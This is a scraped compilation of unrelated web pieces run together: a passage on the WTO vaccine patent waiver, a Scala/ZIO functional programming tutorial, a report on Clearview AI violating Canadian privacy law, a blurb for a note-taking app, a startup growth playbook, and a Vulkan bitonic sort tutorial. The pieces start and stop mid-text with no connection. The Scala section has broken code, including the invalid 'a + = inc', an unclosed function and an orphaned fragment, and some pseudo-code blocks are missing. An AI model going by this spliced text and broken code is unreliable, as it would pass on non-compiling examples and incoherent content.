<p>Civil society’s hopes were further boosted during the C20 — a civil society meeting that runs parallel to the G20 — from January 25 to 27. According to several attendees, Italian officials suggested that the Italian G20 presidency this year could support the waiver. </p>



<p>However, other attendees have played down the importance of those comments, since they weren't issued at the ministerial level and were conciliatory in tone. Indeed, at the official level in Geneva, the Italian foreign ministry said Rome's position was still fully in line with the European Commission's. </p>



<p>Nevertheless, Brandon Locke, policy and advocacy manager at ONE Campaign anti-poverty advocacy group, believes the Italian debate “might just be the crack in the ice to sort of get things rolling.”&nbsp;</p>



<p>“The fallout from the AstraZeneca and Pfizer [vaccine] delays are really causing a massive shift in how a lot of member states are thinking about vaccine supply and the traditional frameworks through which manufacturing was supposed to be carried out,” he said.&nbsp;&nbsp;</p>



<p>Tommaso Valletti, former chief competition economist at the Commission, has also signaled support for the waiver and the issuing of compulsory licenses. "Do we really believe that this would 'jeopardize' future innovation? 2.2m people are dead," he <a rel="noreferrer noopener" href="https://twitter.com/TomValletti/status/1356609791527964677" target="_blank">tweeted</a> on Tuesday.&nbsp;</p>



<p>However, there remains the formidable hurdle that WTO decisions must pass by consensus: Even if Italy did support the waiver, it's unlikely to make any difference.</p>



<h3>Push for unilateral action </h3>



<p>While unified WTO action is unlikely, the EU, U.S., U.K., Switzerland and Japan have offered to help members that want to implement existing "flexibilities" in the WTO’s intellectual property agreement, according to one Geneva trade official.&nbsp;That brings compulsory licensing into play, and countries can implement this individually. Several countries, including <a href="https://www.taylorwessing.com/fr/insights-and-events/insights/2020/04/covid-19-and-public-compulsory-licensing-of-drugs-in-europe" target="_blank">Germany</a> and <a href="https://www.cliffordchance.com/content/dam/cliffordchance/briefings/2020/04/compulsory-licensing-and-new-provisions-affecting-ip-holders-during-the-coronavirus-crisis-in-france-and-globally.pdf" target="_blank">France</a>, have already even strengthened legislation to make these measures easier to implement. </p>



<p>Usually seen as a last resort, there are very few cases of compulsory licensing of medicines. But one could make the case in the context of the coronavirus pandemic, explains Ceyhun Pehlivan, a lawyer at Linklaters’ Madrid office: Governments could say it's an appropriate option if the license holder can't produce enough vaccines or medicines. Opponents of compulsory licenses argue they would discourage companies from producing these kinds of products in the future, Pehlivan added. </p>



<p>Historically, compulsory licensing has certainly not proved an attractive option. Only once in WTO history has a developing country lacking production capabilities forced an export license onto a patent-holding country. In 2007, Rwanda sought to import antiretroviral HIV medicines from Canada — and Ottawa granted the license over a year after the initial ask.</p>



<p>There's another problem — possibly the Achilles' heel of the push for IP waivers and compulsory licenses: While granting a compulsory license may mean that another manufacturer can produce a drug or vaccine without being sued by the license holder, it doesn't give them the all-important know-how or technology transfer to actually make the drug. These are separate from patents and are particularly important for the manufacture of complex drugs, such as mRNA vaccines, which up until now, had never been made before.&nbsp;</p>



<p>The Geneva-based diplomat pointed to the know-how issue as a significant obstacle. “That’s the $1 million question,” the diplomat said.</p>



<p>One possible avenue is the World Health Organization’s COVID-19 <a rel="noreferrer noopener" href="https://www.who.int/emergencies/diseases/novel-coronavirus-2019/global-research-on-novel-coronavirus-2019-ncov/covid-19-technology-access-pool#:~:text=The%20COVID%2D19%20Technology%20Access,knowledge%2C%20intellectual%20property%20and%20data." target="_blank">Technology Access Pool</a> (C-TAP), which was meant to become a source for open-access knowledge on COVID-19 science and technology. However, as yet, not a single patent-holding drugmaker has agreed to sign up.&nbsp;</p>



<h3>‘Guerilla war’ against IP rights&nbsp;</h3>



<p>Behind the spat at the WTO, a larger question looms: Is this an attempt to permanently override aspects of intellectual property rights that some countries disagree with?&nbsp;</p>



<p>“You can essentially see it as a play by two countries, India and South Africa, who never really liked the current intellectual property rights rules of the WTO,” said Simon Evenett, an economics professor at St. Gallen University in Switzerland. “I see it in a broader 25-year-long context of this sort of guerilla war against these rules.”</p>



<p>But for now, patent-defending countries are unlikely to let their guard down on intellectual property at the WTO, even during the pandemic.&nbsp;</p>



<p>“Almost every major pharmaceutical exporter except India has objected to this,” Evenett said. “I don’t see that proposal going ahead, unless circumstances dramatically change.</p>



<p>"But that doesn’t mean that India and South Africa can’t act unilaterally," he added.</p>

<h2 id="h-introduction">Introduction</h2>
<p>The functional programming paradigm is often avoided by developers around the world, who prefer to continue developing applications using an object-oriented programming paradigm, which is better known and more widely used. This rejection of functional programming happens either due to a simple lack of knowledge or because developers tend to think that it is something hard and only useful in academic fields.&nbsp; This is probably because there are a lot of new concepts that are usually explained in a principled way, but full of mathematical jargon. Nothing could be further from the truth: functional programming helps us to solve many of the problems that arise when developing software, especially programs that require high levels of asynchronicity and concurrency, and if it is properly explained it does not have to be something difficult to learn.</p>
<p>Scala language combines the best of both the functional and object-oriented programming worlds, and provides&nbsp; complete interoperability with the vast Java ecosystem. In addition, within the Scala ecosystem, there are libraries such as ZIO, which allow developers to be highly productive and create modern, highly performant and concurrent applications, leveraging the power of functional programming – all without any huge barriers to entry.</p>
<p>In this article, I will explain the principles of functional programming, and then demonstrate how, with the help of Scala and ZIO, we can create applications to solve real-world problems. As an illustrative example, we will implement a hangman game.</p>

<h2 id="h-functional-programming-101">Functional programming 101</h2>
<h3 id="h-what-is-functional-programming">What is functional programming?</h3>
<p><strong>Functional programming</strong> is a programming paradigm, where programs are a composition of <strong>pure</strong> <strong>functions.</strong> This represents a fundamental difference to object-oriented programming, where programs are sequences of statements, usually operating in a mutable state. These are organized into so-called functions, but they are not functions in the mathematical sense, because&nbsp; they do not meet some fundamental characteristics.</p>
<h4 id="h-a-pure-function-must-be-total">A pure function must be total</h4>
<p>Firstly, <strong>a function must be total</strong>, this means that for each input that is provided to the function there must be a defined output. For example, the following function dividing two integers is not total:</p>
<pre><code>def divide(a: Int, b: Int): Int = a / b</code></pre>
<p>To answer why this function is not total, consider what will happen if we try to divide by zero:</p>
<pre><code>divide(5, 0)

// java.lang.ArithmeticException: / by zero</code></pre>
<p>The division by zero is undefined and Java handles this by throwing an exception. That means the divide function is not total because it does not return any output in the case where b = 0.</p>
<p>Some important things we can highlight here:</p>
<ul><li>If we look at the signature of this function, we realize that it’s telling a lie: that for each pair of integers a and b, this function will always return another integer, which we have already seen is not true for all cases.</li><li>This means that every time we call the divide function in some part of our application we will have to be very careful, as we can never be completely sure that the function is going to return an integer.</li><li>If we forget to consider the unhandled case when calling divide, then at runtime our application will throw exceptions and stop working as expected. Unfortunately, the compiler is not able to do anything to help us to avoid this type of situation, this code will compile and we will only see the problems at runtime.</li></ul>
<p>So how can we fix this problem? Let’s look at this alternative definition of the divide function:</p>
<pre><code>def divide(a: Int, b: Int): Option[Int] =
  if (b != 0) Some(a / b) else None</code></pre>
<p>In this case, the divide function returns Option[Int] instead of Int, so that when b = 0, the function returns None instead of throwing an exception. This is how we have transformed a partial function into a total function, and thanks to this we have some benefits:</p>
<ul><li>The function’s signature is clearly communicating that some inputs are not being handled because it returns an Option[Int].</li><li>When we call the divide function in some part of our application, the compiler will force us to consider the case in which the result is not defined. If we don’t, it will be a compile-time error, which means the compiler can help us to avoid many bugs, and they will not appear at runtime.</li></ul>
<h4 id="h-a-pure-function-must-be-deterministic-and-must-depend-only-on-its-inputs">A pure function must be deterministic and must depend only on its inputs</h4>
<p>The second characteristic of a function is that it must be <strong>deterministic and must depend only on its inputs</strong>.&nbsp; This means that for each input that is provided to the function, the same output must be returned, no matter how many times the function is called. For example, the following function for generating random integers is not deterministic:</p>
<pre><code>def generateRandomInt(): Int = (new scala.util.Random).nextInt</code></pre>
<p>To demonstrate why this function is not deterministic, let’s consider what happens the first time we call the function:</p>
<pre><code>generateRandomInt() // Result: -272770531</code></pre>
<p>And then, what happens when we call the function again:</p>
<pre><code>generateRandomInt() // Result: 217937820</code></pre>
<p>We get different results! Clearly this function is not deterministic and its signature is misleading again, because it suggests that it does not depend on any input to produce an output, whereas in truth there is actually a hidden dependency on a scala.util.Random object. This may cause problems, because we can never really be sure how the generateRandomInt function is going to behave, making it difficult to test.</p>
<p>Now, let’s have a look at an alternative definition. For this, we’ll use a custom random number generator, based on an example from the <a href="https://livebook.manning.com/book/functional-programming-in-scala/chapter-6/22">Functional Programming in Scala book</a>:</p>
<pre><code>final case class RNG(seed: Long) {
  def nextInt: (Int, RNG) = {
    val newSeed = (seed * 0x5DEECE66DL + 0xBL) &amp; 0xFFFFFFFFFFFFL
    val nextRNG = RNG(newSeed)
    val n       = (newSeed &gt;&gt;&gt; 16).toInt
    (n, nextRNG)
  }
}

def generateRandomInt(random: RNG): (Int, RNG) = random.nextInt</code></pre>
<p>This new version of the generateRandomInt function is deterministic: no matter how many times it is called, we will always get the same output for the same input and the signature now clearly states the dependency on the random variable. For example:</p>
<pre><code>val random        = RNG(10)
val (n1, random1) = generateRandomInt(random) // n1 = 3847489, random1 = RNG(252149039181)
val (n2, random2) = generateRandomInt(random) // n2 = 3847489, random2 = RNG(252149039181)</code></pre>
<p>If we want to generate a new integer, we must provide a different input:</p>
<pre><code>val (n3, random3) = generateRandomInt(random2) // n3 = 1334288366, random3 = RNG(87443922374356)</code></pre>
<h4 id="h-a-pure-function-must-not-have-side-effects">A pure function must not have side effects</h4>
<p>Finally, a function must not have any side effects. Some examples of side effects are the following:</p>
<ul><li>memory mutations,</li><li>interactions with the outside world, such as:<ul><li>printing messages to the console,</li><li>calling an external API,</li><li>querying a database.</li></ul></li></ul>
<p>This means that a pure function can only work with immutable values ​​and can only return an output for a corresponding input, nothing else.</p>
<p>For example, the following increment function is not pure because it works with a mutable variable a:</p>
<pre><code>var a = 0;
def increment(inc: Int): Int = {
  a + = inc
  a

<p>And the following function is not pure either because it prints a message in the console:</p>

  a + b

<h3 id="h-what-are-the-benefits-of-functional-programming">What are the benefits of functional programming?</h3>
<p>For various reasons, functional programming may still seem complex to many. But, if we take a closer look at the&nbsp; benefits, we can change our way of thinking.</p>
<p>For starters, embracing this programming paradigm helps us to break each application down into smaller, simpler pieces that are reliable and easy to understand. This is because a functional source code is often more <strong>concise</strong>, <strong>predictable,</strong> and <strong>easier to test.</strong> But how can we ensure this?</p>
<ul><li>Since pure functions do not rely on any state and instead depend only on their inputs, they are much easier to understand. That is, to understand what a function does, we do not need to look for other parts of the code that could affect its operation. This is known as <strong>local reasoning.</strong></li><li>Their code tends to be more <strong>concise</strong>, which results in <strong>fewer bugs.</strong></li><li>The process of testing and debugging becomes much easier with functions ​​that only receive input data and produce output.</li><li>Since pure functions are deterministic, <strong>applications behave more predictably.</strong></li><li>Functional programming allows us to <strong>write correct parallel programs,</strong> since there is no possibility of having a mutable state, therefore <strong>it is impossible for typical concurrency problems to occur, such as race conditions.</strong></li></ul>
<p>Since Scala supports the functional programming paradigm, these benefits also apply to the language itself. As a result, more and more companies are using Scala, including giants such as&nbsp; LinkedIn, Twitter, and Netflix. In addition, this year Scala is one of the <a href="https://research.hackerrank.com/developer-skills/2020">top 10 languages ​​that developers want to learn.</a></p>
<h2 id="h-but-real-life-applications-need-to-run-side-effects">But … real life applications need to run side effects!</h2>
<p>Now we know that functional programming is about programming with <strong>pure functions</strong>, and that pure functions <strong>cannot produce side effects</strong>, several logical questions arise:</p>
<ul><li>How can we then have an application written using functional programming,&nbsp; which at the same time interacts with external services, such as databases or third-party APIs? Isn’t this somewhat contradictory?</li><li>Does this mean that functional programming cannot be used in real applications, but only in academic settings?</li></ul>
<p>The answer to these questions is the following: <strong>Yes, we can use functional programming in real applications, and not just in academic settings.</strong> For our applications to be able …</p></div></div>

"It is an affront to individuals' privacy rights and inflicts broad based harm on all members of society who&nbsp;find themselves continually in a police lineup."</p>  <p>"This is completely unacceptable."</p>  <p>Therrien said the company continues to claim what it was doing was&nbsp;appropriate, citing the requirement under federal privacy law that its business needs to be balanced against privacy rights."</p>  <p>British Columbia privacy commissioner Michael McEvoy said he was struck by the "vast amount" of information that was collected without consent.</p>  <p>"I find it unacceptable, to be frank, deeply troubling, that a company would create a giant database of our biometric data and sell it for profit without regard to recognizing or acknowledging how invasive it really is."</p>  <p>McEvoy said the case also highlights the need to strengthen privacy laws in Canada.</p>  <p>"In this case we are left without the ability to consider financial sanctions. This lack of enforcement power combined with Clearview's blatant disregard of privacy laws leaves Canadians vulnerable."</p>  <h2>Delete photos of Canadians in database, commissioners say</h2>  <p>The commissioners called for Clearview&nbsp;AI to stop offering its technology in Canada, stop collecting images of Canadians and to delete the photos of Canadians it had already collected in its database.</p>  <p>If the company refuses to follow the recommendations, the four privacy commissioners will "pursue other actions available under their respective acts to bring Clearview&nbsp;into compliance with Canadian laws," the statement said.</p>  <p>However, the four acknowledged that under current laws, and even under proposed changes to federal privacy laws, their ability to penalize the company or force it to comply with Canadian orders is&nbsp;limited.</p>  <p><strong><em>WATCH |&nbsp;Clearview AI violated Canadian privacy law with facial recognition: report</em></strong></p>  <p><span><span><div><div title="Clearview AI violated Canadian privacy law with facial recognition: report" role="button" tabindex="0"><div><div aria-labelledby="1853359683716-metadata-" title="Clearview AI violated Canadian privacy law with facial recognition: report"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/78/543/clearview-ai-facial-daigle-030221.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Canadian privacy commissioners have found that American technology company Clearview AI violated Canadian law when it collected images of people without their knowledge or consent.<!-- --> <!-- -->1:55</span></span></span></p>  <p>UK Information Commissioner Elizabeth Denham's office confirmed Wednesday that their office is still investigating Clearview&nbsp;AI in conjunction with the Office of the Australian&nbsp;Information Commissioner.</p>  <div><p>Doug Mitchell, lawyer for Clearview AI, said the company simply collects public data in the same way as&nbsp;companies like Google.</p><p>  "Clearview AI's technology is not available in Canada and it does not operate in Canada. In any event, Clearview AI only collects public information from the Internet which is explicitly permitted under PIPEDA," Mitchell wrote in a statement, issued minutes after the report was made public.</p></div>  <div><p>PIPEDA, Canada's Personal Information Protection and Electronic Documents Act, governs companies.</p><p>  "The Federal Court of Appeal has previously ruled in the privacy context that publicly available information means exactly what it says: 'available or accessible by the citizenry at large.'" Mitchell wrote. "There is no reason to apply a different standard here."</p></div>  <h2>Privacy experts say technology could be misused</h2>  <p>The report by Therrien, McEvoy, Alberta privacy commissioner Jill Clayton and Diane Poitras, president of Quebec's Commission d'accès à l'information,&nbsp;comes nearly seven months after Clearview&nbsp;AI agreed to no longer make its controversial facial recognition software available in Canada. A number of Canadian law enforcement agencies, including the RCMP, Toronto and Calgary police, had been using the advanced technology to help identify perpetrators and victims of crimes.</p>  <p>With the technology, police could input the picture of a victim or suspected criminal and compare it with billions of photos it had collected from the internet and social media accounts.</p>  <p>However, privacy experts warned&nbsp;that the technology could be misused.</p>  <p>While police forces said last summer that they stopped using Clearview AI, questions remained about what would happen to the personal information of Canadians that the company had already collected and whether the company would stop collecting personal information belonging to Canadians.</p>  <h2>'Proud of our record in assisting Canadian law enforcement'</h2>  <p>In July, company CEO Hoan Ton-That said the company had ceased its operations in Canada. He said Canadians would be able to opt out of Clearview AI's search results.</p>  <p>"We are proud of our record in assisting Canadian law enforcement to solve some of the most heinous crimes, including crimes against children," Ton-That said in a statement at the time. "We will continue to co-operate with the (Office of the Privacy Commissioner) on other related issues."</p>  <p>The investigation found&nbsp;that Clearview&nbsp;AI&nbsp;collected images in Canada and actively marketed its services to Canadian police forces. The RCMP&nbsp;paid for its services, and there were 48 accounts created for law enforcement agencies and other organizations across Canada.</p>  <p>In a separate investigation, the federal privacy commissioner's office is probing&nbsp;the way the RCMP used Clearview AI's technology.</p>  <p>In a news conference, Therrien said a small number of private companies in Canada, which he did not name, had also used Clearview AI's technology, but have since stopped.</p>  <p>While the company is no longer allowing its technology to be used in Canada. Therrien said it has refused to delete the photos of Canadians in its database. While it allows individuals to apply to them to be deleted, it requires them to send a photo, he said.</p>  <p>The case raises the thorny issue of the use of facial recognition technology by police and shines a light on the lack of rules and regulations surrounding it in Canada.</p>  <p>Therrien said the privacy commissioners plan to provide guidance this spring to law enforcement agencies concerning the technology but he said Canada's laws have to be updated. While proposed updates to Canada's privacy laws currently before Parliament (Bill C-11) would give him order making powers he currently does not possess, he would like to see the law amended to make it clearer that business concerns should not outweigh privacy.</p>  <p>Therrien said the company has likely collected the images of millions of Canadians in its 3 billion image database.</p>  <p>Therrien said he would also like to see&nbsp;more types of violations subject to penalties than are currently called for in Bill C-11.</p>  <p>NDP MP Charlie Angus, who had called for an investigation into Clearview&nbsp;AI, praised the report,</p>  <p>Angus said he plans to call Therrien&nbsp;to present his findings to the House of Commons ethics committee and wants the head of the RCMP to appear before the committee as well.</p>  <p>"I will be requesting the head of the RCMP&nbsp;to testify as to why the RCMP&nbsp;used a technology that was illegal and why they misrepresented their use of this illegal technology," he said in an e-mail to CBC News.</p>  <p>However, Angus said he doesn't plan to call on Clearview AI to testify since they are not currently operating in Canada.</p>  <p>Catherine Fortin, spokeswoman for the RCMP, said the force used Clearview AI's technology in a "limited capacity" for its investigations into online sexual exploitation of children and stopped using the technology in July 2020 when the company stopped offering it in Canada.</p>  <p>"With the nature of crime constantly evolving, law enforcement agencies, including the RCMP, must continuously monitor emerging and evolving technologies," Fortin&nbsp;said in an email to CBC News. "We also recognize that privacy is paramount and a reasonable expectation of Canadians, which must be balanced with the ability of law enforcement to conduct investigations and protect the safety and security of Canadians."</p>  <p>Fortin said the RCMP&nbsp;is working with Therrien's office on its investigation into how the force used the technology and will review the report made public Wednesday.</p>  <p>Meanwhile, Conservative MP Michael Barrett said in a statement that he was "deeply concerned" by the findings of the investigation into Clearview AI and called for the House of Commons ethics committee to hold hearings into the company.</p>  <p>"Clearview AI's rejection of the Privacy Commissioner's findings and its disregard for Canadian privacy laws raises serious concerns and deserves further scrutiny by parliamentarians."</p>  <p>Elizabeth Thompson can be reached at <a href="mailto:elizabeth.thompson@cbc.ca">elizabeth.thompson@cbc.ca</a></p>  </span></p></div></div>]]>

<h2>What is Spiral?</h2>
<p>Spiral is a program that allows users to take notes in a format similar to a spiral notebook. Unlike traditional word processors and text editors that are configured in a way that makes it difficult to document things in a non-linear fashion, Spiral pages allow users to click anywhere to start typing and easily move elements of their page around the screen. Additionally, all Spiral content is stored in plain HTML files, making it easy for users to modify their content from outside of Spiral if you wish. Spiral's UI also uses your desktop environment's system theme, so its color palatte matches your system.</p>
	<h2>Features</h2>
	<ul>
	<li data-sourcepos="8:1-8:31">Non-linear document structure</li>
	<li data-sourcepos="9:1-9:55">HTML-based document scheme allows for rich 
	formatting</li>
	<li data-sourcepos="11:1-11:76">Files are auto-saved</li>
	<li data-sourcepos="12:1-13:0">More to come</li>
	</ul>
	
	<h2>Screenshots</h2>
	<p>Note: Spiral uses system theming, so it will look different depending on your system configuration. The screenshots below were taken on my personal development system, which runs Manjaro with KDE and uses the KDE Sweet theme.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>[TL;DR: I have an idea; not sure what to do next; guide on metrics to set in order to achieve a seed round or Series A.]</p> <h3 id="0-getting-started">0: Getting Started</h3> <p>Say you're working on a project somewhere. It might not even be a company. Nobody cares about what you're doing. How the heck will this turn into Stripe, for chrissake? "Get more users", they say. "Get revenue", they say.</p> <p>But what does that even <em>mean</em>? That sounds vague, big, ominous, and unquantifiable. And the other games, like improving <em>just a little bit</em> at getting your boss to like you or answering email feel <em>very</em> achievable. Very clear what to do next.</p> <p>The reason there aren't more startups is because it's a weird game to play. The differential in scores is giant, and the next action to take unclear. And especially when starting, <em>it's all headwind</em>. There is no inertia of success. It's really not clear what to do if you want to start SpaceX. Elon's score on the leaderboard is so large it feels useless to play the game.</p> <p>I’ve found it most useful to turn this challenge into something that feels achievable. To work as expediently as possible to get to a point where you're performing for <em>real, paying users</em> instead of your local friends, Boss, or whatever.</p> <p>This is a playbook for how to get started with very bite-sized, achievable steps. (BTW, this blog post has been implemented into software! Try out <a href="https://pioneer.app/launcher">Pioneer Launcher</a>.)</p> <h3 id="week-1-10-friends">Week #1: 10 Friends</h3> <p>Building SpaceX feels infinitely far away. But everything big starts small. Just focus on showing your product to 10 people this week. Just ten. This can be in the real world, over Zoom, whatever. Distant cousins or friends. Ten people, that is all. In the ever-connected era of the Internet, this should be very doable. Focus on the amount of interaction you have with them, not just hitting the number.</p> <p>You want these 10 people to be your base. Your core. You'll be using them as motivational fuel over the next few weeks. So make sure they really care about what you're building.</p> <p>Open iMessage. Start scrolling down. Send invites to whoever is recent. Think of yourself as planning a small party, but on the Internet instead of a bar.</p> <h3 id="week-2-100-chats">Week #2: 100 Chats</h3> <p>This is the most important step. Let's imagine the above took a week. I would then try to get to 100 users by the end of this month.</p> <p>You don't have to <em>meet</em> these people. You just need to get 100 people chatting with you. A WhatsApp group that's filled with excitable users who adore your product. If you did 10 users last week, just step it up to 20, 30, then 40 over the next 3 weeks.</p> <p>It'll get easier as you go along, both due to viral referrals and because you'll have an audience to perform for. Something to show people. That alone will give you motivational fuel.</p> <p>This, in my opinion, is the key step. Once you build your own club of 100 truly delighted customers, the feedback loop will kick in. You'll want to perform for them.</p> <h3 id="week-5-1000-revenue">Week #5: $1,000 Revenue</h3> <p>Now that you've gotten to 100 users, you might want to think about getting to $1,000 <em>dollars</em> in revenue. This shouldn't be too hard.</p> <p>All you need to do is 20% of your users (let's imagine 80% refuse) to pay you $50. Twenty people, fifty dollars. Talk to them. Figure out what they'll pay for. Build that. (It helps that you first focused on getting them to love you, they'll be more responsive.)</p> <p>You have a 100 users. Assuredly you can ask all of them this week?</p> <h3 id="week-6-10000-arr">Week #6: $10,000 ARR</h3> <p>Now that you've gotten to $1,000 in revenue, it's time to get to $10,000 in ARR. This may sound large, but it's a forgiving metric. ARR stands for annual recurring revenue, and it really only means that you need to get those same 20 people paying you $50, but each month. (These numbers are just defaults. You should be adjusting. It might be only 5 users paying you $200 a month, or 1,000 paying you $1 a month.)</p> <p>Do what makes sense to you, but make the goal achievable for yourself. Play a game you can win.</p> <p>If you make it this far quickly, we'll gladly fund you. We'll incorporate your company, fly you out to Silicon Valley, the whole shebang. (I can't blindly commit to this, obviously! But the odds are very, very high.)</p> <hr> <p>Concluding: just try and build a club of 100 people in WhatsApp in the next 30 days. Forget SpaceX, forget Stripe, or Airbnb. Get 100 loving users in a chatroom, and everything else will follow. If you need an extra jolt, check out <a href="https://pioneer.app/">Pioneer</a>.

  	<div><p>A <a href="https://en.m.wikipedia.org/wiki/Bitonic_sorter">bitonic sorting network</a> lays out <em>a sequence of compare-and swap operations</em> that, when applied to an array of sortable elements, sorts these elements.</p>
<figure>
<img src="https://poniesandlight.co.uk/img/bitonic_merge_sort/strip.png" alt="Major steps in bitonic merge sort" title="Major steps in bitonic merge sort">
<figcaption>
    <strong>Fig. 0:</strong> Major steps of a bitonic merge sorting network applied to 1024 sortable elements.<p>The pixels in the final square are sorted by brightness, left-to-right and top-to-bottom.
</p></figcaption>
</figure>
<h2 id="why-bitonic-merge-sort">Why Bitonic Merge Sort?&nbsp;<a href="#why-bitonic-merge-sort"></a></h2>
<p>The beauty of this algorithm is that it maps really well onto parallel hardware, such as a GPU, where it has constant and relatively low performance complexity <span>\(  O(\log^2(n)) \)</span>. That is to say: It's <strong>quite fast</strong>. The implementation I'm discussing here was able to sort 1M random ints in 4ms. Compared to the 40ms I measured for C++'s <code>std::sort</code>, that's a 10x speedup! On top of that, for a given number of sortable elements, it will always take the same amount of time to complete.</p>
<p>When the algorithm executes, each worker thread performs one single operation for every pair of sortable elements: compare-and-swap. But how to choose the correct pairings for sortable elements? This is where the algorithm's complexity is buried.</p>
<h2 id="constructing-a-bitonic-sorting-network">Constructing a Bitonic Sorting Network&nbsp;<a href="#constructing-a-bitonic-sorting-network"></a></h2>
<p>First, let's look at a diagram of a relatively small sorting network, say, for 16 sortable elements. The diagram is for the <a href="https://en.m.wikipedia.org/wiki/Bitonic_sorter#Alternative_representation">alternative representation of a bitonic sorting network</a>, as I found it on wikipedia. I prefer this version because it is slightly simpler: all worker threads use the same direction for their compare-and-swap operations.</p>
</div>
<figure>
<img src="https://poniesandlight.co.uk/img/bitonic_merge_sort/bitonic_sort.svg">
<figcaption>
	    <p><strong>Fig.1:</strong> Sorting diagram for 16 sortable elements<br>Horizontal lines represent array indices into our array of sortable elements, each vertical line represents one worker thread performing a compare-and-swap operation.
	    </p>
</figcaption>
</figure>
<div>
<p>In the diagram, each worker thread is drawn as a vertical line, with the start- and endpoints marking the indices of the current pair of sortable elements. All coloured blocks which are in the same column form a step, wich can be executed in parallel. We can see from the diagram that the number of threads per step is constant, and that it is always <code>n/2</code>, with <code>n</code> being the number of sortable elements.</p>
<p>Before we proceed to figuring out sort index pairs for each worker thread based on each thread's execution step and thread number, lets take a step back, look at the diagram through squinted eyes and see if some patters emerge if we group similar looking blocks together.</p>

<li>Green block: doubles in height until it reaches total number of
elements. Let's call such a block <strong>flip</strong></li>
<li>Yellow block: after each green block, there is a cascade of yellow
blocks, each half the previous height, until its height spans only
two sortable elements. Let's call such a block <strong>disperse</strong></li>
<li>Blocks are <strong>periodic</strong> within their column.</li>
</ol>
<p>We can write the following pseudo-code:</p>

</div><h2 id="look-at-inner-patterns">Look at inner patterns:&nbsp;<a href="#look-at-inner-patterns"></a></h2>
<p>Looking at the diagram again, we see that each of the two block types, green and yellow, follow distinct patterns for how each worker thread grabs pairs of sortable elements:</p>
<figure>

<figcaption>
    While worker thread lines inside green ("flip") blocks start at full height and converge towards the centre, in yellow ("disperse") blocks they start at half height, and then shift down. We also note that the only variable controlling the pattern is the overall height <code>h</code> of a yellow or green block.
</figcaption>
</figure>
<p>We can therefore split the problem in two:</p>
<ol>
<li>Find rule to calculate pairs for green (“flip”) block based on height <code>h</code>.</li>
<li>Find rule to calculate pairs for yellow (“disperse”) block based on height <code>h</code>.</li>
</ol>
<h2 id="index-pairs-for-flip-green-blocks">Index pairs for “flip” (green) blocks&nbsp;<a href="#index-pairs-for-flip-green-blocks"></a></h2>
<p>Let's enumerate sortable element index pairs from our green blocks, and label them <span>\(  T_{0\dots t} \)</span>, where <span>\(  t \)</span> represents the worker thread index to which a sortable element index pair is assigned to:</p>
<p><span>\(  \begin{align*} h = 2 &amp;: T_0 [0:1] \\  h = 4 &amp;: T_0 [0:3], T_1[1:2]\\ h = 8 &amp;: T_0 [0:7], T_1 [1:6], T_2 [2:5], T_3 [3:4]\\ \end{align*} \)</span></p>
<p>We see that we can form pairs of indices based on the following rule:</p>
<p><span>\(  T_t = [ t : h-t-1], \text{ for } t = 0,\dots,h/2 \)</span></p>
<h2 id="index-pairs-for-disperse-yellow-blocks">Index pairs for “disperse” (yellow) blocks&nbsp;<a href="#index-pairs-for-disperse-yellow-blocks"></a></h2>
<p>Similarly, if we enumerate index pairs for yellow blocks we get</p>
<p><span>\(  \begin{align*} h = 2 &amp;: T_0 [0:1] \\  h = 4 &amp;: T_0 [0:2], T_1[1:3]\\ h = 8 &amp;: T_0 [0:4], T_1 [1:5], T_2 [2:6], T_3 [3:7]\\ \end{align*} \)</span></p>
<p>We see that we can form pairs of indices based on the following rule:</p>
<p><span>\(  T_t = [t : t + h/2], \text{ for } t = 0,\dots,h/2 \)</span></p>
<h2 id="rules-for-rows-of-blocks">Rules for rows of blocks&nbsp;<a href="#rules-for-rows-of-blocks"></a></h2>
<p>Now, let's look at the diagram again.</p>
<figure>

<figcaption>
    <strong>Fig. 3:</strong> <br>Our original diagram
</figcaption>
</figure>
<p>We notice that both green and yellow blocks repeat vertically until they fill out the full height of their column. We can model this repetition as a combination of modulo (the pattern is the same <em>within</em> a block) and an <span>integer-division based offset</span><span>: basically, for the offset, we quantize the <code>t</code> signal at <code>h</code>-resolution</span>.</p>
<p>As a first step, we make sure both rules for green and yellow blocks are contained within their respective height, <span>\(  h \)</span>. Note that we define these rules now for the total number of sortable elements, <span>\(  n \)</span> instead of the earlier <span>\(  h \)</span>. Instead of using <span>\(  t \)</span> “unbounded”, we introduce a new term around <span>\(  t \)</span>:</p>
</div>
<div>
		
	
<p><span>\(  T_t = [ q + (t\bmod \frac{h}{2}) : q + h-(t \bmod \frac{h}{2})-1], \text{ for } t = 0,\dots,n/2 \)</span></p>
</div>
<div>
		
	
<p><span>\(  T_t = [ q + (t \bmod \frac{h}{2}) : q + (t \bmod \frac{h}{2}) + \frac{h}{2}], \text{ for } t = 0,\dots,n/2 \)</span></p>
<p>What does the new term <span>\(  (t \bmod \frac{h}{2}) \)</span> do? It limits the output for the term for any given <span>\(  t \)</span> to <span>\(  0,\dots,h/2 \)</span>, something you will recognise as a condition for our earlier rules.</p>
<p>You will also have noted that both rules introduced a new variable <span>\(  q \)</span>, which represents the offset. We can express <span>\(  q \)</span> fully as a function of <span>\(  h \)</span> and <span>\(  t \)</span>:</p>
</div>
<div>
	
<p><span>\(  q = \lfloor{ (\frac{2t}{h}) } * h \)</span></p>
<p>In pseudo-code, this translates to:</p>

<p>In order to test these little formulas, and becasue I thought it would generate some nice visuals, I wrote <a href="https://gist.github.com/tgfrerer/b11221e91793a4361d41a8550916722f">a little C program</a> which, when given a count of sortable elements, prints a diagram, and index pairs for each step of the resulting sorting network.</p>

<p>Now that we have a reliable and tested method to generate index pairs, we can take a stab at implementing the algorithm using Vulkan Compute.</p>
<p>In Vulkan, compute tasks require us to bind a compute pipeline - which is thankfully very simple and takes a single compute shader. We'll get to the code for the compute shader in a little bit, but for now, let's look at what we need to specify in order to dispatch a compute command:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td>
<td>
<pre><code data-lang="c"><span>// Provided by VK_VERSION_1_0
</span><span></span><span>void</span> <span>vkCmdDispatch</span>(
    VkCommandBuffer                             commandBuffer,
    uint32_t                                    groupCountX,
    uint32_t                                    groupCountY,
    uint32_t                                    groupCountZ);
</code></pre></td></tr></tbody></table>
</div>
